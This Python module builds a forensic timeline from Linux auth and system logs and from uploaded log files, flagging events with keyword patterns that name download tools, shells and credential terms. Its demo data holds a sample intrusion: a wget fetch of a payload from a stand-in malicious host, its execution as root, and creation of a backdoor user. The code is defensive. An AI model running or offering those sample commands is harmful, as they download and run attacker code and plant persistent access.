import os
import re
import json
from datetime import datetime


def parse_linux_auth_log(log_path="/var/log/auth.log"):
    """
    Parse Linux authentication logs.
    Find: login attempts, sudo usage, SSH connections.
    """
    events = []

    if not os.path.exists(log_path):
        return events

    try:
        with open(log_path, 'r', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue

                event = {
                    'raw'      : line,
                    'source'   : 'auth.log',
                    'severity' : 'info'
                }

                # Failed login
                if 'Failed password' in line or 'authentication failure' in line:
                    event['type']     = 'FAILED_LOGIN'
                    event['severity'] = 'high'
                    # Extract IP
                    ip_match = re.search(r'from (\d+\.\d+\.\d+\.\d+)', line)
                    if ip_match:
                        event['src_ip'] = ip_match.group(1)

                # Successful login
                elif 'Accepted password' in line or 'session opened' in line:
                    event['type']     = 'SUCCESS_LOGIN'
                    event['severity'] = 'medium'

                # Sudo usage
                elif 'sudo' in line.lower():
                    event['type']     = 'SUDO_USAGE'
                    event['severity'] = 'medium'

                # New user created
                elif 'useradd' in line or 'adduser' in line:
                    event['type']     = 'USER_CREATED'
                    event['severity'] = 'high'

                else:
                    event['type'] = 'AUTH_EVENT'

                # Parse timestamp from log line
                try:
                    parts     = line.split()
                    timestamp = f"{parts[0]} {parts[1]} {parts[2]}"
                    event['timestamp'] = timestamp
                    event['message']   = ' '.join(parts[5:])[:100]
                except Exception:
                    event['timestamp'] = 'Unknown'
                    event['message']   = line[:100]

                events.append(event)

    except PermissionError:
        events.append({
            'type'      : 'ERROR',
            'message'   : 'Permission denied reading auth.log - run as root',
            'severity'  : 'info',
            'timestamp' : datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'source'    : 'system'
        })

    return events[-100:]  # Last 100 events


def parse_syslog(log_path="/var/log/syslog"):
    """
    Parse system logs for suspicious activity.
    """
    events = []

    if not os.path.exists(log_path):
        # Try alternative paths
        alt_paths = ['/var/log/messages', '/var/log/kern.log']
        for alt in alt_paths:
            if os.path.exists(alt):
                log_path = alt
                break
        else:
            return events

    suspicious_keywords = [
        'error', 'fail', 'denied', 'attack',
        'malware', 'virus', 'intrusion', 'exploit'
    ]

    try:
        with open(log_path, 'r', errors='ignore') as f:
            lines = f.readlines()[-200:]  # Last 200 lines

        for line in lines:
            line_lower = line.lower()
            if any(kw in line_lower for kw in suspicious_keywords):
                parts = line.strip().split()
                events.append({
                    'type'      : 'SYSLOG_ALERT',
                    'timestamp' : ' '.join(parts[:3]) if len(parts) >= 3 else 'Unknown',
                    'message'   : line.strip()[:150],
                    'source'    : 'syslog',
                    'severity'  : 'medium'
                })

    except Exception:
        pass

    return events[:50]


def parse_uploaded_log(file_path):
    """
    Parse any uploaded log file.
    Supports: auth.log, syslog, Windows Event Log exports,
    Apache/Nginx logs, custom application logs.
    """
    events = []

    if not os.path.exists(file_path):
        return events

    # Patterns to look for in any log
    patterns = [
        (r'failed|failure|error|denied',           'FAILURE',    'high'),
        (r'success|accepted|granted|logged in',    'SUCCESS',    'medium'),
        (r'(\d{1,3}\.){3}\d{1,3}',                'IP_FOUND',   'info'),
        (r'sudo|admin|root|administrator',          'PRIV_ACCESS','medium'),
        (r'download|wget|curl|ftp',                'DOWNLOAD',   'high'),
        (r'delete|remove|drop|truncate',           'DELETION',   'high'),
        (r'password|passwd|credentials|secret',    'CREDENTIAL', 'high'),
        (r'cmd|powershell|bash|shell|exec',        'EXECUTION',  'high'),
    ]

    try:
        with open(file_path, 'r', errors='ignore') as f:
            for i, line in enumerate(f):
                if i > 1000:  # Limit processing
                    break

                line = line.strip()
                if not line:
                    continue

                for pattern, event_type, severity in patterns:
                    if re.search(pattern, line, re.IGNORECASE):
                        # Try to extract timestamp
                        ts_match = re.search(
                            r'\d{4}-\d{2}-\d{2}[T\s]\d{2}:\d{2}:\d{2}', line
                        )
                        timestamp = ts_match.group(0) if ts_match else f'Line {i+1}'

                        events.append({
                            'type'      : event_type,
                            'timestamp' : timestamp,
                            'message'   : line[:150],
                            'source'    : os.path.basename(file_path),
                            'severity'  : severity,
                            'line_num'  : i + 1
                        })
                        break  # One event per line

    except Exception as e:
        events.append({
            'type'      : 'ERROR',
            'message'   : f'Could not parse file: {str(e)}',
            'severity'  : 'info',
            'timestamp' : datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'source'    : file_path
        })

    return events


def build_timeline(sources=None, log_file=None):
    """
    Main function - builds complete forensic timeline.
    Combines events from multiple sources sorted by time.
    """
    all_events = []

    # Collect from system logs
    print("[timeline] Parsing auth logs...")
    auth_events = parse_linux_auth_log()
    all_events.extend(auth_events)

    print("[timeline] Parsing syslog...")
    sys_events = parse_syslog()
    all_events.extend(sys_events)

    # Parse uploaded log file
    if log_file and os.path.exists(log_file):
        print(f"[timeline] Parsing uploaded file: {log_file}")
        uploaded_events = parse_uploaded_log(log_file)
        all_events.extend(uploaded_events)

    # If no real events, show demo
    if not all_events:
        all_events = get_demo_timeline()

    # Count by severity
    high_count   = sum(1 for e in all_events if e.get('severity') == 'high')
    medium_count = sum(1 for e in all_events if e.get('severity') == 'medium')

    return {
        'total_events' : len(all_events),
        'high_events'  : high_count,
        'medium_events': medium_count,
        'events'       : all_events[-100:],
        'scan_type'    : 'Timeline Analysis',
        'verdict'      : 'SUSPICIOUS' if high_count > 3 else 'CLEAN',
        'is_phishing'  : high_count > 3,
        'confidence'   : min(90, 40 + high_count * 5),
        'threat_score' : high_count,
        'reasons'      : [f'{high_count} high severity events found in logs'] if high_count > 0 else []
    }


def get_demo_timeline():
    """Demo timeline data for testing."""
    return [
        {'type':'SUCCESS_LOGIN', 'timestamp':'2026-07-04 02:14:33',
         'message':'Accepted password for root from 45.12.34.56 port 52341',
         'source':'auth.log', 'severity':'medium'},
        {'type':'SUDO_USAGE', 'timestamp':'2026-07-04 02:14:45',
         'message':'root : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash',
         'source':'auth.log', 'severity':'medium'},
        {'type':'DOWNLOAD', 'timestamp':'2026-07-04 02:15:02',
         'message':'wget http://malicious.xyz/payload.sh -O /tmp/payload.sh',
         'source':'syslog', 'severity':'high'},
        {'type':'EXECUTION', 'timestamp':'2026-07-04 02:15:10',
         'message':'bash /tmp/payload.sh executed by root',
         'source':'syslog', 'severity':'high'},
        {'type':'FAILED_LOGIN', 'timestamp':'2026-07-04 02:16:00',
         'message':'Failed password for invalid user admin from 192.168.1.100',
         'source':'auth.log', 'severity':'high'},
        {'type':'USER_CREATED', 'timestamp':'2026-07-04 02:17:30',
         'message':'useradd backdoor_user added to system',
         'source':'auth.log', 'severity':'high'},
    ]
